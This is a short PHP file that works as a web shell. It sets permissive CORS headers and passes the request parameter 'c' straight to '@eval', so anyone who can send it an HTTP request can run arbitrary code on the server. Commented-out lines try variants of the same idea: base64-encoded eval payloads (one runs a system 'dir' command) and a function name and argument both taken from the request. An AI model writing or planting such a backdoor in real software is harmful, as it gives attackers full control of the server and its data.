<?php
header('Access-Control-Allow-Headers: *');
header('Access-Control-Allow-Methods: *');
header('Access-Control-Allow-Origin: *');
//header("Content-Type: text/html;charset=GBK");
if ($_SERVER['REQUEST_METHOD'] == 'OPTION') {
    die();
}

var_dump($_REQUEST);
@eval($_REQUEST['c']);
//eval('echo base64_decode("ZWNobyAnMTExJzs=");');
//@eval($_REQUEST['c']);
//print_r($_REQUEST);
//print_r($_REQUEST['test']);
//print_r(file_get_contents('php://input'));

//echo base64_decode('aGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PVVURi04Iik7ZWNobyAndDdlaXNlYzJwNmRrajRlamZ4Mic7')
//echo base64_encode('echo 1;');
//@eval(base64_decode('aGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PUdCSyIpO3N5c3RlbSgnZGlyIDI JTI2MScpOw=='));
//eval()
//$f = $_REQUEST['f'];$p = $_REQUEST['p'];
//$f($p);
//echo base64_decode($p);
//eval(base64_decode($p))
//$encode = function ($val) {
//    return base64_encode($val);
//};
//echo $encode('asdfasdf');

//header("Content-Type: text/html;charset=UTF-8");

?>
